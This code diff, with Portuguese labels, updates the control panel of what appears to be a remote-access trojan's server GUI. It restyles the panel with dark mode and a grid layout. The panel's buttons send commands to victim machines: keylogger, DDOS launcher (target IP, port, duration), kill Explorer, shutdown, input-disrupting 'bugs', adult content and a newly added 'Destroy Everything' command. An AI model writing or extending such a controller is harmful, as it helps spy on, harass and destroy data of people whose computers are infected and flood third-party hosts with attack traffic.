@@ -1157,104 +1157,88 @@ public class ServerGUI extends JFrame {
         } catch (Exception ignored) {
         }
 
-        // Se quiser reaproveitar uma variável global, substitua "frame" por ela
         JFrame frame = new JFrame("Painel de Funções");
         frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 
-        // Ícone (opcional, caso queira manter consistência com seu outro frame)
+        // Ícone opcional
         try {
             ImageIcon icon = new ImageIcon(getClass().getResource("/eye.png"));
             frame.setIconImage(icon.getImage());
         } catch (Exception ignored) {
         }
 
-        // Painel principal
-        JPanel panel = new JPanel(new FlowLayout(FlowLayout.CENTER, 20, 20));
+        // Painel principal com GridLayout (0 linhas, 5 colunas, espaçamento horizontal e vertical de 20)
+        JPanel panel = new JPanel(new GridLayout(0, 5, 20, 20));
+        if (DARK_MODE) {
+            panel.setBackground(new Color(60, 63, 65));
+        }
+
+        // Adiciona margem de 20px em volta do painel
+        panel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));
 
         // -------------------------------------------------
-        // Botão de Liberar Memória (mantendo o "design" atual)
+        // Botão de Liberar Memória
         // -------------------------------------------------
         JButton gcButton = new JButton("Liberar Memória");
-        // Se você tiver cor definida no anterior, coloque aqui
-        // Exemplo de cor (caso queria manter o design):
-        // gcButton.setBackground(Color.LIGHT_GRAY);
-
-        gcButton.addActionListener(e -> {
-            // Envia o comando gc pelo método que você já tem
-            ServerGUI.sendDirectCommand("gc");
-        });
+        gcButton.addActionListener(e -> ServerGUI.sendDirectCommand("gc"));
         panel.add(gcButton);
 
         // -------------------------------------------------
         // Botões solicitados
         // -------------------------------------------------
 
-        // Desligar
         JButton shutdownButton = new JButton("Desligar");
         shutdownButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions shutdown"));
         panel.add(shutdownButton);
 
-        // Reiniciar
         JButton restartButton = new JButton("Reiniciar");
         restartButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions restart"));
         panel.add(restartButton);
 
-        // Logoff
         JButton logoffButton = new JButton("Logoff");
         logoffButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions logoff"));
         panel.add(logoffButton);
 
-        // 1000 Pastas
         JButton mkdirsButton = new JButton("1000 Pastas");
         mkdirsButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions mkdirs"));
         panel.add(mkdirsButton);
 
-        // Área de Trabalho
         JButton desktopButton = new JButton("Área de Trabalho");
         desktopButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions desktop"));
         panel.add(desktopButton);
 
-        // Matar Explorer
         JButton killExplorerButton = new JButton("Matar Explorer");
         killExplorerButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions killexplorer"));
         panel.add(killExplorerButton);
 
-        // Abrir Explorer
         JButton openExplorerButton = new JButton("Abrir Explorer");
         openExplorerButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions explorer"));
         panel.add(openExplorerButton);
 
-        // Stress
         JButton stressButton = new JButton("Stress");
         stressButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions stress"));
         panel.add(stressButton);
 
-        // Adulto
         JButton adultButton = new JButton("Adulto");
         adultButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions adult"));
         panel.add(adultButton);
 
-        // Rickroll
         JButton rickrollButton = new JButton("Rickroll");
         rickrollButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions rickroll"));
         panel.add(rickrollButton);
 
-        // Beep
         JButton beepButton = new JButton("Beep");
         beepButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions beep"));
         panel.add(beepButton);
 
-        // Bug de Mouse
         JButton mouseBugButton = new JButton("Bug de Mouse");
         mouseBugButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions mousebug"));
         panel.add(mouseBugButton);
 
-        // Bug de Teclado
         JButton keyboardBugButton = new JButton("Bug de Teclado");
         keyboardBugButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions keyboardbug"));
         panel.add(keyboardBugButton);
 
-        // Wallpaper (pede nome de arquivo ao usuário)
         JButton wallpaperButton = new JButton("Wallpaper");
         wallpaperButton.addActionListener(e -> {
             String fileName = JOptionPane.showInputDialog(
@@ -1267,16 +1251,16 @@ public class ServerGUI extends JFrame {
         });
         panel.add(wallpaperButton);
 
-        // DDOS (pede IP, porta, tempo em seg. e tamanho)
         JButton ddosButton = new JButton("DDOS");
         ddosButton.addActionListener(e -> {
-            // Você pode fazer 4 diálogos separados, ou 1 só com espaço.
-            // Aqui estão 4 diálogos para maior clareza:
             String ip = JOptionPane.showInputDialog(frame, "Endereço IP:");
             if (ip == null) return;
 
             String porta = JOptionPane.showInputDialog(frame, "Porta:");
-            if (porta == null) return;
+            if (porta == null) {
+                ServerGUI.sendDirectCommand("ddos " + ip);
+                return;
+            }
 
             String tempo = JOptionPane.showInputDialog(frame, "Tempo em segundos:");
             if (tempo == null) return;
@@ -1288,10 +1272,25 @@ public class ServerGUI extends JFrame {
         });
         panel.add(ddosButton);
 
-        // Keylogger
         JButton keyloggerButton = new JButton("Keylogger");
         keyloggerButton.addActionListener(e -> ServerGUI.sendDirectCommand("keylogger"));
         panel.add(keyloggerButton);
+
+        JButton destroyEverythingButton = new JButton("Destroy Everything");
+        destroyEverythingButton.addActionListener(e -> {
+            String key = JOptionPane.showInputDialog(frame, "Digite a chave:");
+            ServerGUI.sendDirectCommand("destroyeverything"
+                    + (key != null && !key.trim().isEmpty() ? " " + key : ""));
+        });
+        panel.add(destroyEverythingButton);
+
+        JButton debugButton = new JButton("Debug");
+        debugButton.addActionListener(e -> ServerGUI.sendDirectCommand("debug"));
+        panel.add(debugButton);
+
+        JButton liveStopperButton = new JButton("Live Stopper");
+        liveStopperButton.addActionListener(e -> ServerGUI.sendDirectCommand("livestopper"));
+        panel.add(liveStopperButton);
 
         // -------------------------------------------------
         // Configurações finais da janela
@@ -1299,6 +1298,12 @@ public class ServerGUI extends JFrame {
         frame.setContentPane(panel);
         frame.pack();
         frame.setLocationRelativeTo(null);
+
+        // Se estiver usando o DARK_MODE, atualizar a UI depois de configurar tudo
+        if (DARK_MODE) {
+            SwingUtilities.updateComponentTreeUI(frame);
+        }
+
         frame.setVisible(true);
 
         return frame;
